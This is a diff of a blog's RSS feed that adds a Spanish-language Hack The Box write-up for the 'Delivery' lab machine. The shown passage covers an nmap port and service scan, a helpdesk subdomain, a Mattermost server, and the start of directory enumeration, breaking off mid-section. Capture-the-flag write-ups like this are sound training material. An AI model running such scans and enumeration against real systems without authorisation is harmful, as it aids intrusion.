@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Sat, 15 May 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 22 May 2021 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,581 @@
     
     
 
+      
+      <item>
+        <title>Hack The Box - Delivery</title>
+        <link>https://sckull.github.io/posts/delivery/</link>
+        <pubDate>Sat, 22 May 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 22 May 2021 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/delivery/</guid>
+        <description>Delivery es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Delivery es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th&gt;Delivery&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;OS&lt;/td&gt;
+&lt;td&gt;Linux&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;30&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;10.10.10.222&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/3769&#34;&gt;ippsec&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
+&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto 8065 abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Feb 10 18:30:51 2021 as: nmap -p- --min-rate 1000 -T4 -oN allports delivery.htb&lt;/span&gt;
+Warning: 10.10.10.222 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; delivery.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.222&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.076s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;57054&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;8478&lt;/span&gt; filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8065/tcp open  unknown
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Feb 10 18:33:37 2021 -- 1 IP address (1 host up) scanned in 166.34 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Feb 10 18:34:08 2021 as: nmap -p 22,80,8065 -sV -sC -oN serviceports delivery.htb&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; delivery.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.222&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.44s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp   open  http    nginx 1.14.2
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.14.2
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Welcome
+8065/tcp open  unknown
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad Request
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/plain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Request
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.0 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Accept-Ranges: bytes
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Cache-Control: no-cache, max-age&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;31556926, public
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;3108&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Security-Policy: frame-ancestors &lt;span class=&#34;s1&#34;&gt;&amp;#39;self&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; script-src &lt;span class=&#34;s1&#34;&gt;&amp;#39;self&amp;#39;&lt;/span&gt; cdn.rudderlabs.com
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Last-Modified: Wed, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 17:44:49 GMT
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     X-Frame-Options: SAMEORIGIN
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     X-Request-Id: t3i5h6aemfgxj8mhzygap77tdo
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Wed, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 23:37:10 GMT
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!doctype html&amp;gt;&amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;robots&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;noindex, nofollow&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;referrer&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;no-referrer&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;title&amp;gt;Mattermost&amp;lt;/title&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mobile-web-app-capable&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;application-name&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Mattermost&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;format-detection&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;telephone=no&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;link re
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   HTTPOptions: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.0 &lt;span class=&#34;m&#34;&gt;405&lt;/span&gt; Method Not Allowed
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Wed, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 23:37:11 GMT
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8065-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2/10%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;60246D78%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ge
+SF:nericLines,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GetRequest,DF3,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:rs\x20&amp;#39;self&amp;#39;;\x20script-src\x20&amp;#39;self&amp;#39;\x20cdn\.rudderlabs\.com\r\nConten
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Wed,\x2010\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20Feb\x202021\x2017:44:49\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:X-Request-Id:\x20t3i5h6aemfgxj8mhzygap77tdo\r\nX-Version-Id:\x205\.30\.
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Wed,\x
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:2010\x20Feb\x202021\x2023:37:10\x20GMT\r\n\r\n&amp;lt;!doctype\x20html&amp;gt;&amp;lt;html\x
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20lang=\&amp;#34;en\&amp;#34;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta\x20charset=\&amp;#34;utf-8\&amp;#34;&amp;gt;&amp;lt;meta\x20name=\&amp;#34;viewport
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\&amp;#34;\x20content=\&amp;#34;width=device-width,initial-scale=1,maximum-scale=1,user
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:-scalable=0\&amp;#34;&amp;gt;&amp;lt;meta\x20name=\&amp;#34;robots\&amp;#34;\x20content=\&amp;#34;noindex,\x20nofollo
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:w\&amp;#34;&amp;gt;&amp;lt;meta\x20name=\&amp;#34;referrer\&amp;#34;\x20content=\&amp;#34;no-referrer\&amp;#34;&amp;gt;&amp;lt;title&amp;gt;Matter
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:most&amp;lt;/title&amp;gt;&amp;lt;meta\x20name=\&amp;#34;mobile-web-app-capable\&amp;#34;\x20content=\&amp;#34;yes\&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:&amp;gt;&amp;lt;meta\x20name=\&amp;#34;application-name\&amp;#34;\x20content=\&amp;#34;Mattermost\&amp;#34;&amp;gt;&amp;lt;meta\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:name=\&amp;#34;format-detection\&amp;#34;\x20content=\&amp;#34;telephone=no\&amp;#34;&amp;gt;&amp;lt;link\x20re&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;H
+SF:TTPOptions,5B,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0Wed,\x2010\x20Feb\x202021\x2023:37:11\x20GMT\r\nContent-Length:\x200\r
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\n\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RTSPRequest,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Help,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSLSessionReq,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x2
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TerminalServerCookie
+SF:,67,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;&lt;/span&gt;
+SF:&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Feb 10 18:35:45 2021 -- 1 IP address (1 host up) scanned in 97.53 seconds&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
+&lt;p&gt;Encontramos una pagina corriendo en el puerto 80 la cual muestra un nuevo subdominio &lt;code&gt;helpdesk.delivery.htb&lt;/code&gt; y un link de referencia hacia el puerto 8065 de MatterMost server. En la pagina menciona que debemos de tener una cuenta en &lt;code&gt;helpdesk&lt;/code&gt; para acceder a Mattermost (&lt;code&gt;Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.&lt;/code&gt;).&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_173903.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;rustbuster&#34;&gt;RUSTBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos rustbuster para busqueda de directorios y archivos, pero la pagina al parecer solo es una pagina estatica sin más.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
